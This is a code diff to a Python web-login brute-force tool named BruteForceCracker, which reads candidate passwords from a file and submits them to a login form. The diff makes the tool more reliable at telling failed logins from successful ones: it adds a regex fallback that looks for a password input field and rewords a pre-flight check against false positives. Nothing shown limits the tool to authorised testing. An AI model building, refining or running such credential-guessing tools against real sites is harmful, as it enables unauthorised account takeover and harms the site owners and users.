@@ -99,16 +99,28 @@ class BruteForceCracker:
                 return False
 
             # Check if login was successful
-            # Returns False (FAIL) if error message found
-            # Returns True (SUCCESS) if error message NOT found
-            if self.error_message in str(response.content) or self.error_message in response.text:
+            # Strategy:
+            # 1. Check for specific error message (negative match)
+            # 2. Check if we are still on the login page by looking for the password field (fallback negative match)
+
+            response_text = response.text
+
+            if self.error_message in str(response.content) or self.error_message in response_text:
                 return False
-            else:
-                if verbose:
-                    print("\n[+] Success!")
-                    print("Username: ---> " + self.username)
-                    print("Password: ---> " + password)
-                return True
+
+            # If explicit error message not found, check if the response still contains a password input field.
+            # If it does, we likely just re-rendered the login page (failed login).
+            # This handles cases where the user-provided error message was typo'd or not visible in HTML source (e.g., hidden toaster).
+            if re.search(r'<input[^>]+type=["\']password["\']', response_text, re.I):
+                return False
+
+            # If we get here, neither the error message nor the password field was found.
+            # Assume success (redirected to dashboard, etc.)
+            if verbose:
+                print("\n[+] Success!")
+                print("Username: ---> " + self.username)
+                print("Password: ---> " + password)
+            return True
         except Exception as e:
             # print(f"Request failed for {password}: {e}")
             return False
@@ -151,17 +163,21 @@ def main():
     # Pre-flight check to prevent false positives
     print("[*] Verifying configuration with a random password...")
     random_pass = secrets.token_hex(8)
+
+    # Use a fresh session for pre-flight check to simulate real attempt
+    # We essentially "crack" a known wrong password.
+    # If crack() returns True, it means it thinks the login was successful (False Positive).
     if cracker.crack(random_pass, verbose=False):
         print(f"\n[!] ERROR: False positive detected!")
         print(f"[!] The script detected 'Success' for a known wrong password ('{random_pass}').")
-        print(f"[!] This means the Error Message you provided ('{error}') was NOT found in the server's response.")
+        print(f"[!] This means the script could not detect the login failure.")
         print(f"[!] Please check:")
-        print(f"    1. Is the Error Message correct and exact?")
+        print(f"    1. Is the Error Message correct?")
         print(f"    2. Are the field names correct ({user_field}, {pass_field})?")
-        print(f"    3. Is the website returning the error in the HTML response body?")
+        print(f"    3. If the error is dynamic/hidden (e.g. toaster), the script fell back to checking for a password field but couldn't find one.")
         return
     else:
-        print("[+] Configuration verified. Error message was correctly found in the response.")
+        print("[+] Configuration verified. Login failure was correctly detected.")
 
     try:
         f = open("passwords.txt", "r")
